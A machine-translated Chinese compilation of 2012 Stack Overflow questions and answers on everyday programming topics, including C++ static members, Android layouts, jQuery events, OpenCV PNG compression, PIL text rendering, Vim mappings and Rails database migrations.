当然，还有其他访问静态变量的方法，例如使`counter`变量成为类的静态成员`GameObject`（我会推荐）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T14:23:59.370

在您的代码中，`counter`不是您的类的静态成员，而只是一个很好的旧全局变量。您可以在网上的任何地方阅读如何声明静态成员变量，但这里有一些片段：

**游戏对象.h**

```
#pragma once
class GameObject
{
public: 
    GameObject(void);
    GameObject(int);
    ~GameObject(void);

private:
    int id;

// static members
public: 
    static int counter; // <<<<<<<<<<< declaration
}; 
```

**ameObject.cpp**

```
#include "GameObject.h"

int GameObject::counter = 0; // <<<<<<<<<<< instantiation

GameObject::GameObject(void)
{
    counter++;
}

GameObject::GameObject(int i)
{
    counter++;
    id = i;
}

GameObject::~GameObject(void)
{
} 
```

**主文件**

```
#include <iostream>
#include "GameObject.h"

using namespace std;

int main()
{
    GameObject obj2(45);
    cout << "version one: " << obj2.counter << endl;

    // second version:
    cout << "version two: " << GameObject::counter << endl;

    system("pause");
    return 0;
} 
```

Afaik 在该类的实例上访问静态成员应该可以正常工作，但它给人的印象是错误的，您应该更喜欢版本二。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-12-04T14:06:29.093

没关系，我用getter方法做到了。关闭线程

# android - RelativeLayout 中的“android:layout_above”参数

> ID：13704650
> 
> 赞同：-1
> 
> 时间：2012-12-04T14:01:49.287
> 
> 标签：android, layout, android-relativelayout

首先，这是我的xml：

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
              android:layout_width="fill_parent"
              android:layout_height="fill_parent"
              android:orientation="horizontal"
              android:background="@android:color/white">

    <LinearLayout [...]
                  android:layout_above"@+id/test">
    </LinearLayout>

    <LinearLayout [...]>

        <LinearLayout [...]
                      android:id="@+id/test"/>

    </LinearLayout>
</RelativeLayout> 
```

这个xml不起作用...

有什么选择吗？将`android:layout_above`参数设置为另一个视图中的视图？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T14:22:23.503

我修改了你的一些代码..请试试这个

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
              android:layout_width="fill_parent"
              android:layout_height="fill_parent"
              android:orientation="horizontal"
              android:background="@android:color/white">

    <LinearLayout [...]
                      android:id="@+id/test">
    </LinearLayout>

    <LinearLayout [...]
                  android:layout_below"@+id/test">

        <LinearLayout [...]/>

    </LinearLayout>
</RelativeLayout> 
```

# javascript - 未捕获的 ReferenceError：未定义 openDatabase

> ID：13704655
> 
> 赞同：0
> 
> 时间：2012-12-04T14:02:09.267
> 
> 标签：javascript, web-sql, google-chrome-app

我正在尝试使用`openDatabase`Google Chrome 应用程序，但显示以下错误：

> 未捕获的 ReferenceError：未定义 openDatabase

`unlimitedStorage`我还在manifest.json 中添加了权限 ( )。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-04T14:23:17.150

[如您在文档](https://developer.chrome.com/apps/app_deprecated.html)中所见，Chrome 应用程序禁用了 WebSQL 。

如果您想永久保存数据，请使用[`chrome.storage`](https://developer.chrome.com/extensions/storage.html)API[`IndexedDB`](https://developer.mozilla.org/en-US/docs/IndexedDB)或[`chrome.fileSystem`](https://developer.chrome.com/apps/app_storage.html)API（不要与[HTML5 文件系统 API](https://developer.mozilla.org/en-US/docs/DOM/File_API/File_System_API)混淆！）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-04-11T22:40:57.563

dexie js 在 chrome 应用程序中表现出色

# javascript - 如何在javascript中的参数对象中获取每个参数的名称

> ID：13704656
> 
> 赞同：1
> 
> 时间：2012-12-04T14:02:10.297
> 
> 标签：javascript

在 javascript 中，我们有 arguments 对象，它不是我们可以查询的数组。

如何获取每个参数的名称？

例如，如果我想知道第三个参数被称为**嵌入**，我将如何发现这一点？

```
arguments[2].name == "embedded' 
```

显然上面的方法是行不通的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T14:07:33.110

恐怕这是不可能的。只有值本身被传递：

```
function logArguments(){
    for(key in arguments)
        console.log(key, arguments[key]);
}
var someObject = {someProperty:false};

logArguments("1", 3, "Look at me I'm a string!", someObject);
// Returns:
// 0 1
// 1 3
// 2 "Look at me I'm a string!"
// 3 Object {someProperty: false} 
```

所以你只能得到他们的数组索引。

但是，您可以使用它`for(key in arguments){}`为函数提供任意数量的参数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T14:04:29.470

该`arguments`对象是参数列表，它不存储参数的名称。

一些浏览器允许您使用该`toString`方法来获取函数的代码：

```
function a(arg1){}
// undefined
a.toString()
// "function a(arg1){}" 
```

如果您需要命名参数，通常传递一个对象：

```
$.ajax({
  url: "test.html",
  cache: false
}) 
```

我不确定您要实现什么...如果您使用位置参数并且第三个参数称为“嵌入”，那么名称`arguments[2]`将始终为“嵌入”。但是，尽管您知道在编写代码时，参数的名称并没有存储在您可以方便地访问它们的任何地方。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T14:08:06.540

像这样的东西

```
function a() {
    var arr = Array.prototype.slice.call(arguments, 0, arguments.length);
    for (var aux in arr) {
        alert(aux + ":" + arguments[aux]);
    }
} 
```

src： [https ://developer.mozilla.org/en-US/docs/JavaScript/Reference/Functions_and_function_scope/arguments](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Functions_and_function_scope/arguments)

# c# - 将 IEnumerable 发送到已经包含模型的视图

> ID：13704658
> 
> 赞同：0
> 
> 时间：2012-12-04T14:02:19.967
> 
> 标签：c#, asp.net, .net, asp.net-mvc, asp.net-mvc-4

这是**视图：**

```
@model tgpwebged.Models.sistema_DocType
 ... 
```

此模型是与 textBoxFor 和其他 html 助手一起使用的实体

这是**控制器。**

```
public ActionResult AdminSettingAddTipo()
{
    IEnumerable<string> indices;

    using (tgpwebgedEntities context = new tgpwebgedEntities())
    {
        var obj = from u in context.sistema_Indexes select u.idName;
         indices = obj.ToList();
    }

    return PartialView(indices);
} 
```

我在这里有我需要的一切，我正在使用一个模型来创建视图，所以我不允许将“索引”作为模型发送，因为一个视图中不允许有 2 个模型。

我现在不想使用“Tupe”作为父视图。我只想知道如何将我的 IEnumerable 发送到视图的最佳方式。

我正在考虑将 ViewBag 作为最后一个选项，但我正在避免使用 ViewBag。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T14:10:08.087

ViewBag 不是一个好的选择。使用您的列表和当前模型创建 ViewModel：

```
 public class YourViewModel
    {

        public sistema_DocType Type { get; set; }
        public IEnumerable<string> Indices {get;set;}
    } 
```

希望，它会有所帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T14:09:00.350

如果您出于某种原因不想使用 ViewBag，则可以专门为视图创建一个模型，其中包含来自旧模型的信息和所需的新索引。这是 MVC 开发中的常见模式。您甚至可以让 ViewModel 成为当前模型的装饰器。

[http://geekswithblogs.net/michelotti/archive/2009/10/25/asp.net-mvc-view-model-patterns.aspx](http://geekswithblogs.net/michelotti/archive/2009/10/25/asp.net-mvc-view-model-patterns.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T14:08:07.443

尽可能使用强定义，将其应用于模型并发送该模型：

**模型**

```
public class MyModel{
     public List<sistema_Indexes> indecies {get;set;}

} 
```

**控制器**

```
MyModel model = new MyModel();
model.indecies = context.sistema_Indexes.Select(u=> u.idName).ToList(); 
```

# ruby - 如何使用 Ruby 从 Ubuntu 连接到在 Windows 中运行的 MS SQL Server？

> ID：13704663
> 
> 赞同：0
> 
> 时间：2012-12-04T14:02:32.377
> 
> 标签：ruby, sql-server, ubuntu

> **可能重复：**
> [如何通过 Ruby 连接到 SQL Server 2005 数据库](https://stackoverflow.com/questions/2026952/how-to-connect-to-sql-server-2005-database-through-ruby)

我使用 SQL Server 2008 开发了一个数据库。我的同事开发了网页，并在 Ubuntu 12.04 中使用 Ruby 1.9.3 和他的本地主机 MySQL 数据库。我们如何使用 Ruby 连接到 MS SQL 数据库？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T14:31:25.240

查看[tiny_tds](https://github.com/rails-sqlserver/tiny_tds) ——Ken Collins (@metaskills) 为与 MS SQL 对话而创建的出色宝石

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T15:16:57.020

除了使用前面提到的 TinyTDS，还可以考虑使用[Sequel](http://sequel.rubyforge.org/) ORM。它可以轻松连接到多个数据库并抽象它们语言的差异，因此您可以专注于编程，而不是使用不同风格的 SQL 编写查询。

# magento - Magento 使用简单的产品价格而不是超级属性价格

> ID：13704665
> 
> 赞同：0
> 
> 时间：2012-12-04T14:02:41.553
> 
> 标签：magento, configuration, attributes, super

我有一个具有超级属性的可配置产品和一些简单产品（价格不同）。在管理员中，当我选择 Configurable Product >> Associated Products 时，我可以看到简单的产品。在前端，当我尝试将这些简单产品之一添加到购物篮而不是查看该简单产品的价格时，我看到的是可配置产品的价格 + 所选产品的超级属性配置中的值。有谁知道如何更改它以便使用简单的产品价格？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-28T02:37:55.557

几年前，我遇到了完全相同的问题，Magento EE 支持无法提供太多帮助。客户有一个只包含简单产品的 ERP 系统。因此可配置产品仅用于在 Magento 中创建购物体验。这使得忽略 Magento 中基本 + 偏移可配置定价模型的简单产品定价成为一个问题。永远无法理解忽略附加元定价模型的可用定价数据的逻辑！？

Magento EE 支持非正式地将我指向第三方扩展。[http://www.magentocommerce.com/magento-connect/simple-configurable-products.html](http://www.magentocommerce.com/magento-connect/simple-configurable-products.html) 不再支持此扩展，因此核心升级需要工作以保持工作正常。看起来还有其他扩展可以解决这个问题，可以提供支持。

我想相信比我更聪明的人可以解释解决这个问题的更好方法。

# image-processing - OpenCV imwrite 增加 png 图像的大小

> ID：13704667
> 
> 赞同：5
> 
> 时间：2012-12-04T14:02:59.143
> 
> 标签：image-processing, opencv, compression, png

我正在对 png 图像进行图像处理。我有以下问题。使用 imwrite() 函数保存图像后，图像的大小会增加。比如之前的图片是847KB，保存后就变成了1.20MB。这是一个代码。我只是读取图像然后保存它，但是尺寸增加了。我试图设置压缩参数，但它没有帮助。

```
Mat image;
image = imread("5.png", -1); 

vector<int> compression_params;
compression_params.push_back(CV_IMWRITE_PNG_COMPRESSION);
compression_params.push_back(9);
compression_params.push_back(0);

imwrite("output.png",image,compression_params); 
```

可能是什么问题？请提供任何帮助。谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-04T14:44:34.397

PNG 有几个影响压缩的选项：deflate 压缩级别 (0-9)、deflate 策略 (HUFFMAN/FILTERED) 以及内部预测误差过滤器的选择（或动态选择策略）（AVERAGE、PAETH...） . 似乎 OpenCV 只允许您更改第一个，并且[第二个](http://opencv-users.1802565.n2.nabble.com/CV-IMWRITE-PNG-COMPRESSION-any-better-way-tp6099651p6486745.html)没有一个好的默认值。所以，看来你必须忍受这一点。

更新：查看[来源](https://github.com/opencv/opencv/blob/2dc5e245d0c0a644bd72f98e306fbd8b59aa91ba/modules/imgcodecs/src/grfmt_png.cpp#L384)，似乎已经添加了压缩策略设置（在[投诉](https://code.ros.org/trac/opencv/ticket/1452)之后），但没有[记录](http://docs.opencv.org/modules/highgui/doc/reading_and_writing_images_and_video.html#imwrite)。我想知道该来源是否已发布。尝试使用 Z_FILTERED 设置选项 CV_IMWRITE_PNG_STRATEGY 看看会发生什么

有关参数的更多详细信息，请参阅链接的源代码。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2021-06-10T02:12:12.647

@Karmar，自您上次编辑以来已经有很多年了。

我在 2021 年 6 月遇到了与您类似的困惑。我发现了某件事可能会使像我们这样的其他人受益。

PNG 文件似乎有一个叫做**mode**的东西。在这里，我们只关注三种模式`RGB`：`P`和`L`。要快速检查图像的模式，可以使用 Python：

```
from PIL import Image
print(Image.open("5.png").mode) 
```

基本上，当 using`P`并且`L`您归因于`8 bits/pixel`while `RGB`uses `3*8 bits/pixel`。有关更详细的解释，可以参考这篇精美的 stackoverflow 帖子：[PIL 中 'P' 和 'L' 模式中的图像有什么区别？](https://stackoverflow.com/questions/52307290/what-is-the-difference-between-images-in-p-and-l-mode-in-pil)

现在，当我们使用 OpenCV 打开一个 PNG 文件时，我们得到的将是一个包含三个通道的数组，无论该文件保存到哪种模式。数据类型的三个通道`uint8`，也就是说当我们把`imwrite`这个数组变成一个文件时，无论你怎么压缩它，如果保存在`P`或`L`模式下，都很难击败原始文件。

我猜@Karmar 可能已经解决了这个问题。对于未来的读者，请检查您自己的模式`5.png`。

# jquery - 使用 .append 中的 id

> ID：13704669
> 
> 赞同：0
> 
> 时间：2012-12-04T14:03:04.737
> 
> 标签：jquery

我遇到了一些jQuery代码的小问题......

首先，我有这段代码很好用：

```
 $(".add_cheque").click(function() {
        nb_cheque += 1;
        var html = '<tr><td><input type="checkbox" checked="checked"></td><td><input type="text" name="montant'+nb_cheque+'" id="montant" value="Montant" /></td>';
        $('#services_pack').append(html);
    }); 
```

所以现在，我想使用添加到页面的文本输入中的“montant”选择器，以及 keyup 功能......但它不起作用......如果我做类似的事情：

```
$('#montant').keyup(function() {
        alert('test keyup');
    }); 
```

我在`#montant`输入中输入了一些东西，没有任何事情发生......

任何人 ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T14:08:54.920

您需要在 #montant 添加到 DOM 后触发此事件

```
$(".add_cheque").click(function() {
    nb_cheque += 1;
    var html = '<tr><td><input type="checkbox" checked="checked"></td>'
      + '<td><input id="montant' + nb_cheque +'" type="text"' // unique ID
      + 'name="montant'+nb_cheque+'" id="montant" value="Montant" /></td>';
    $('#services_pack').append(html);

    // Here
    $('#montant' + nb_cheque).keyup(function() {
       alert('test keyup');
    });
}); 
```

**或者**你可以设置一个 live(.on/.delegate/.live/etc) 事件按键

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T14:09:00.053

每次您单击 add_cheque 时，您都会创建一个新行和一个按钮。每个按钮都会变成 #monant 作为 id ......但是 dom id 必须是唯一的......

你也必须关闭你的

尝试使用这样的 jquery 对象创建您的按钮

```
var newButton = jQuery('<input type="text" name="montant'+nb_cheque+'" value="Montant" />');

var jRow = jQuery('<tr><td><input type="checkbox" checked="checked"></td><td></td></tr>';

//add your button
jRow.find('td:last').append(newButton);

jQuery('#services_pack').append(jRow);

newButton.keyUp(function(){
    //your method
}); 
```

# libmemcache - memcached 1.6 失败

> ID：13704671
> 
> 赞同：0
> 
> 时间：2012-12-04T14:03:09.833
> 
> 标签：libmemcache

尝试构建 memcached 1.6，但失败并出现以下错误。如何解决问题？

libtool：编译：gcc -std=gnu99 -DHAVE_CONFIG_H -I。-I./include -I./libevent -I./engines/default_engine -I./include -I./libevent -fvisibility=hidden -pthread -g -O2 -Wall -Werror -pedantic -Wmissing-prototypes -Wmissing-声明 -Wredundant-decls -MT default_engine_la-assoc.lo -MD -MP -MF .deps/default_engine_la-assoc.Tpo -c 引擎/default_engine/assoc.c -fPIC -DPIC -o .libs/default_engine_la-assoc.o mv -f .deps/default_engine_la-assoc.Tpo .deps/default_engine_la-assoc.Plo /bin/sh ./libtool --tag=CC --mode=compile gcc -std=gnu99 -DHAVE_CONFIG_H -I. -I./include -I./libevent -I./engines/default_engine -I./include -I./libevent -fvisibility=hidden -pthread -g -O2 -Wall -Werror -pedantic -Wmissing-prototypes -Wmissing-声明 -Wredundant-decls -MT default_engine_la-default_engine.lo -MD -MP -MF .deps/default_engine_la-default_engine。`test -f 'engines/default_engine/default_engine.c' || echo './'`引擎/default_engine/default_engine.c libtool：编译：gcc -std=gnu99 -DHAVE_CONFIG_H -I。-I./include -I./libevent -I./engines/default_engine -I./include -I./libevent -fvisibility=hidden -pthread -g -O2 -Wall -Werror -pedantic -Wmissing-prototypes -Wmissing-声明 -Wredundant-decls -MT default_engine_la-default_engine.lo -MD -MP -MF .deps/default_engine_la-default_engine.Tpo -c 引擎/default_engine/default_engine.c -fPIC -DPIC -o .libs/default_engine_la-default_engine.o

engine/default_engine/default_engine.c：在函数“initialize_configuration”中：engines/default_engine/default_engine.c:506:22：错误：变量“ret”设置但未使用[-Werror=unused-but-set-variable]

cc1: 所有警告都被视为错误 make[1]: *** [default_engine_la-default_engine.lo] 错误 1 ​​make[1]: 离开目录 `/home/user123/Downloads/memcached-1.6.0_beta1' make: *** [all]错误 2

# .net - 我可以使在导入模块中以点为源的函数可访问到父脚本吗？

> ID：13704673
> 
> 赞同：0
> 
> 时间：2012-12-04T14:03:30.807
> 
> 标签：.net, powershell

我已将模块“ModuleFoo.psm1”导入我的脚本：“ModuleBar.ps1”

我调用了导入模块中的一个方法，该方法对函数 BarFunction.ps1 进行点源：

```
function Dot-SourceBarFunction()
{
. "\BarFunction.ps1"
} 
```

我可以让这个 BarFunction.ps1 从父范围访问：ModuleBar.ps1？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-05T04:58:57.563

这应该只是工作，例如：

```
-- Outer.ps1 --
Import-Module $PSScriptRoot\module.psm1
Get-Foo

-- Module.psm1 --
. $PSScriptRoot\inner.ps1

-- Inner.ps1 --
function Get-Foo {
    "$($MyInvocation.MyCommand.Name) called"
} 
```

这输出`Get-Foo called`. 函数默认为模块中的公共可见性，因此当您对在模块中引入函数的脚本进行点源时，这些脚本会自动公开。

# python - 如何像在 Illustrator 中一样在 python 中格式化文本？

> ID：13704678
> 
> 赞同：5
> 
> 时间：2012-12-04T14:03:49.950
> 
> 标签：python, latex, typesetting

我希望实现几个功能来增加我的程序的输出。我想将一列文本的背景设置为某种颜色，以便更清楚地知道列属于一起。

一张图片值一千字：我想转换一下：

```
Pos.  :123456789012345
Name. :ABCDEFGHIJKLMNO  
Str.  :SOMESTRINGSOMET  <---- indented by half a row, Column number superscripted
Str.  :SOM       SOMET
Str.  :SOMESTRIN    ET 
```

对此：

![例子](../Images/6751710e5aad3ac162df4f1f53bb9aff.png)

我怎么能用 python 做到这一点？有没有允许我这样做的框架？我将其转换为乳胶，但是我无法使上标数字起作用。它们需要在文本之上，但不能充当角色，因为图片的列之间存在关系。

> 示例：A 在位置 1。它具有属性 S 和 O，这就是为什么它在这两个之上，这就是为什么有半个字符的缩进。S 的上标为 170，T 的上标为 185。

特别困难的是Str部分被移动了半个字符的部分。我想有一个例子来集成到我的程序中。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-18T04:07:16.720

考虑到单行距字体，可能会想出一些棘手的解决方案，这可能会解决您的问题。但他们只是在等待失败。您帖子中的灰色列可以完全按照您的图添加，但我选择不让它改变字母的颜色（只是因为我发现这样更易读）。

以下是 PIL 可能提出的一些建议：

![在此处输入图像描述](../Images/2fbae97201a28bc6ac7c44b78cde979b.png)

稍微改变字体：

![在此处输入图像描述](../Images/7e569c92e71e905eb2f03db6cd529a7f.png)

接下来会发生更多“严重”的字体更改，所有这些都是按原样生成的。

![在此处输入图像描述](../Images/c5058c008b9c75ca31559ed7880a94a5.png)    ![在此处输入图像描述](../Images/b024d9466db3c5540f0ebe079e8a65b0.png)

接下来是生成这些数字的代码。我并没有把它做得很好，它可以在很多方面进行改进。将此视为一个示例，说明您可能需要做些什么才能为您的问题找到解决方案。要使用任何类型的字体，您都需要一个实际的排版系统，例如 LaTeX。

```
import sys
import Image, ImageDraw, ImageFont

# Assumption: some other piece of code separates the data in the following
# format.
line1 = [("Pos.  :", 0), ("123456789012345", 0)]
line2 = [("Name. :", 0), ("ABCDEFGHIJKLMNO", 0)]
line3 = [("Str.  ", 0), (":", -0.5), ("SOMESTRINGSOMEST", -0.5)]
line4 = [("Wave 1:", 0), ("_XXXX_X____X_X_", 0)]
line5 = [("Wave 2:", 0), ("__XX_XXX_X__X_X", 0)]
line_data = [line1, line2, line3, line4, line5]
# Texts to draw over the last element, in specific positions,
# of lines present in line_data.
subscript = {
        2: { # Meaning: third item in line_data
            0: "170",  # Meaning: draw "170" over the first char
            len(line3[-1][0]) - 1: "185", # Draw "185" over the last char
            7: "180",   # Meaning: draw "180" over the eight char
           },
        4: {5: "hi"},
        3: {6: "ops"}
        }

# If the following fonts are not mono spaced, you are going to suffer.
#
# Normal font.
font = ImageFont.truetype('FreeMono.ttf', 40)
# Font for subscript.
font_tiny = ImageFont.truetype('FreeMono.ttf', 20)

im = Image.new("RGBA", (1000, 1000), 'white')
draw = ImageDraw.Draw(im)
line_offset = 4
start_y = 6

width_A, height_A = font.getsize('A')
_, height_tiny_A = font_tiny.getsize('A')

# Collect even columns from the last item of list line1.
even_columns = []
x = 0
for i, (text, _) in enumerate(line1):
    for j, letter in enumerate(text):
        if i == len(line1) - 1 and not j % 2:
            even_columns.append(x)
        x += width_A

# Write all lines.
width = 0
l_start_y = start_y
for di, data in enumerate(line_data):
    x = 0
    for i, (text, xoff) in enumerate(data):
        for j, letter in enumerate(text):
            # Apply x offset.
            extra = width_A * xoff
            draw.text((x + extra, l_start_y), letter, font=font, fill='black')
            x += width_A
    width = max(x, width)
    l_start_y += height_A + line_offset

# Collect letter positions from the lines that will have subscripts.
letter_pos = {}
for k in subscript:
    letter_pos[k] = {}
    x = sum(len(text) for text, _ in line_data[k][:-1]) * width_A
    text, xoff = line_data[k][-1]
    for i in range(len(text)):
        extra = width_A * xoff
        letter_pos[k][i] = x + extra
        x += width_A
# Write all subscripts.
for k, v in subscript.items():
    line = line_data[k]
    for pos, text in v.items():
        x = letter_pos[k][pos]
        y = start_y + (line_offset + height_A) * k
        y -= height_tiny_A * 0.4 # XXX A poor heuristic that worked here.
        draw.text((x, y), text, font=font_tiny, fill='black')
        width = max(width, int(x + font_tiny.getsize(text)[0]))

# Draw grey columns.
columns = Image.new(im.mode, im.size, 'white')
mask = Image.new("L", im.size, 'white')
for x in even_columns:
    columns.paste((128, 128, 128), (x, line_offset, x + width_A, l_start_y))
    mask.paste(164, (x, line_offset, x + width_A, l_start_y), )
im = Image.composite(im, columns, mask)

# Crop and save the resulting image.
im.crop((0, 0, width, l_start_y + 2)).save(sys.argv[1]) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-13T15:08:43.250

这实际上更像是一个 LaTeX 问题而不是 Python 问题——即，如果您确定了您希望 Python 脚本生成的标记，那么实际生成它相当容易。

在这种情况下，我认为您可能会通过一个相当复杂的表格 ( `\begin{table}...\end{table}`) 获得您想要的效果，其中每个单元格跨越两列，并且一列用作获得所需“半字符”的偏移量。如果在 LaTeX 中有一种更简单的方法可以做到这一点（它的库比我脑子里想的要多），我不会感到惊讶，但这就是我想到的。所以你的桌子看起来像这样：

```
+------+--+--+--+--+--+--+--+
| pos. |  |  1  |  2  |  3  |      ... 
+------+--+--+--+--+--+--+--+
| name.|  |  A  |  B  |  C  |      ... 
+------+--+--+--+--+--+--+--+--+
|      | 170 |     |     |     |   ... 
+------+--+--+--+--+--+--+--+--+
| Str. |  S  |  O  |  M  |  E  |   ... 
+------+--+--+--+--+--+--+--+--+ 
```

（其中`+`s 表示实际列的位置，并且大多数单元格跨越两列。带有“170”的行将使用`\tiny`或某些此类命令。）

我的建议是首先手动生成一个 LaTeX 文件，它可以满足您的需求（或您选择的文件的其他格式语言）；然后担心编写一些python代码来生成它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-18T21:37:48.087

虽然 PIL 适用于简单的东西，但如果你使用 SVG，你有更多的选择。您可以使用[pySVG](http://codeboje.de/pysvg/)（方便[的 pySVG 教程](http://code.google.com/p/pysvg/source/browse/trunk/pySVG/src/tests/pySVGTutorial.py?r=8)）或 svgwrite 以编程方式创建您的 SVG，或者`print`将其作为文本创建。然后使用 ImageMagick（在命令行上`convert`或从 python 使用[pythonmagicwand](https://www.assembla.com/wiki/show/pythonmagickwand)）将 SVG 渲染为您想要的任何光栅类型。在微调 SVG 时，您可以使用文本编辑器对其进行编辑并在 Web 浏览器中查看 :)

```
# make some text in any font, any size, any effects
import pysvg
s = svg()
myStyle = StyleBuilder()
myStyle.setFontFamily(fontfamily="Verdana")
myStyle.setFontSize("5em")
myStyle.setFilling("blue")
t1 = text("Hello World", 0, 100)
t1.set_style(myStyle.getStyle())
s.addElement(t1)
s.save('test.svg')

from pythonmagickwand.image import Image
img = Image('test.svg')
img.format = 'PNG'
img.save('test.png') 
```

# linux - Vim imap jk 不工作

> ID：13704680
> 
> 赞同：4
> 
> 时间：2012-12-04T14:03:54.243
> 
> 标签：linux, vim

在我的 vimrc 中，我重新映射了 jk 以使用 imap 进行转义。

当我使用 jk 时出现问题；它不会逃跑，只会回响`<Esc>`。

这是有问题的条目： `imap jk <Esc>`

说明我也在 Fedora 中使用 vim-X11 也是一个好点。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-04T14:19:24.703

看起来您的`'cpoptions'`设置包含`<`；`<Esc>`然后，无法识别特殊键码。

找出这是通过什么设置的

```
:verbose set cpo? 
```

或重写映射以使用文字转义字符；通过`Ctrl`+输入`V` `Esc`；它应该出现`^[`在缓冲区中。

* * *

`:inoremap`PS：虽然不相关，但除非需要重新映射，否则您通常应该使用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2019-02-16T02:43:04.740

对于那些因为标题而在这里的人，`:set paste`启用时 jk 映射也将不起作用。

# jquery - 加载对搜索引擎友好的页面片段

> ID：13704682
> 
> 赞同：1
> 
> 时间：2012-12-04T14:03:55.153
> 
> 标签：jquery, asp.net, ajax

对不起，如果这是一个稍微笼统的问题。

我有时必须使用 jquery/ajax 从网站内的其他页面加载页面片段。我需要这样做有很多原因，但我知道客户端 ajax 内容对搜索引擎是不可见的。

那是对的吗？如果是这样，是否有另一种搜索引擎友好的方法。

这些网站是asp.NET，虽然我承认我不是.net 专家。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T14:11:30.183

```
I understand client side ajax content is invisible to search engines. 
```

这是对的。像 Google 这样的搜索引擎不会完全遵循 AJAX。

* * *

编辑：不是真的 - 额外的努力是可能的。请参阅 Blazemonger 对 OP 帖子的评论。

* * *

为了对搜索引擎友好，您希望搜索引擎索引的内容需要出现在服务器构建的页面中，在任何 Javascript 或其他添加内容的客户端脚本之前。

在您的页面呈现给最终用户之前，您是否能够在您的服务器上加载页面片段并将它们构建到您的页面中？这将是谷歌友好的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T15:53:38.307

要在 .net 中的多个页面之间重用 HTML，请查看这篇 OReily 文章： [http ://ofps.oreilly.com/titles/9781449320317/ch_ReusableUI.html](http://ofps.oreilly.com/titles/9781449320317/ch_ReusableUI.html)

如果重复使用的内容来自同一台服务器，这是让搜索引擎快速找到并让用户浏览您的网站的最佳方式。

# php - PHP 在点击上传按钮时更改图像 src：

> ID：13704683
> 
> 赞同：1
> 
> 时间：2012-12-04T14:03:57.463
> 
> 标签：php, javascript, ajax, upload

我不确定这是否可能，但我想如果是的话，我会知道的。基本上我使用 ajax-upload 脚本来上传图像，在上传按钮下方显示当前图像的缩略图。

它用于商店产品，因此产品有许多图片，在加载“编辑产品”页面时，所有缩略图都是已经保存到数据库的缩略图。但是，当用户单击上传按钮并选择不同的文件时，我希望显示新图像，但问题是，它尚未插入数据库。

代码如下所示：

```
<tr>
    <td align="right">Product Thumbnail:</td>
    <td>
     <table>
        <tr>
         <td>
           <div id="upload" >
              <button type="button">Upload</button>
           </div>
         </td>
         <td id="myfilename"></td>
        </tr>
    </table>
   </td>
  </tr>
   <tr>
    <td align="right">Thumb:</td>
    <td align="left">
    <img src="../shop/<?php echo $prodinforow["ProdThumb"]; ?>" width="115" border="0">&nbsp;<a href=""><img src="images/1001-cancel16.gif" width="16" height="16" alt="" border="0"></a>
    <div id="upload"></div>
    </td>
    </tr> 
```

因此，您可以看到 img src 在一个简单的查询中从数据库中得到回显，该查询进一步位于实际页面上，这很好用。我知道上传图像的文件名会在文件上传时保存到一个名为“附件”的隐藏表单输入中。但在提交表单之前。

无论如何我可以在页面提交之前将图片的来源更改为上传的吗？或者任何人都可以用聪明的方法来做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T14:09:08.467

您可以使用 jQuery 或纯 javascript 来修改 src 属性。您需要为 img 标签提供一个 id 属性，以便将其与其他 img 标签区分开来。这是一个非常基本的示例，您需要使用它才能使其正常工作：

```
// using jquery, assuming a button with the id "upload_button"
// is pressed when the image is selected
$('#upload_button').click(function() {
    $('img#my_img').attr('src', './path/to/new/image');
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T14:06:35.640

给图片一个id，比如

`<img id = "my_image" src="../shop/<?php echo $prodinforow["ProdThumb"]; ?>`

然后：

在上传按钮的onclick中，输入：

`<div onclick="document.getElementById('myImage').src = '/path/to/image'" id="upload"></div>`

# ruby-on-rails - Rails 单独的数据库迁移不起作用

> ID：13704686
> 
> 赞同：0
> 
> 时间：2012-12-04T14:04:17.377
> 
> 标签：ruby-on-rails, ruby-on-rails-3, rails-migrations

我正在尝试使用`establish_connection`. 我在迁移文件中有这样的东西：

```
def change
  ActiveRecord::Base.establish_connection("user_#{Rails.env}")
  ActiveRecord::Base.initialize_schema_migrations_table

  create_table "users", :force => true do |t|
    t.string   "email",  
end 
```

在 yml 我有这个配置：

```
user_development:
  adapter: postgresql
  encoding: unicode
  database: MyApp_user_development
  pool: 5
  host: localhost
  username: xxx
  password: xxx 
```

我还定义了这样的用户模型：

```
class User < ActiveRecord::Base
  establish_connection "user_#{Rails.env}"
  [...]
end 
```

现在，数据库存在，但运行时`rake db:migrate`出现此错误：

```
==  CreateUserOnSeparateDb: migrating =========================================
rake aborted!
An error has occurred, this and all later migrations canceled:

connection is closed 
```

你们中有人知道发生了什么吗？

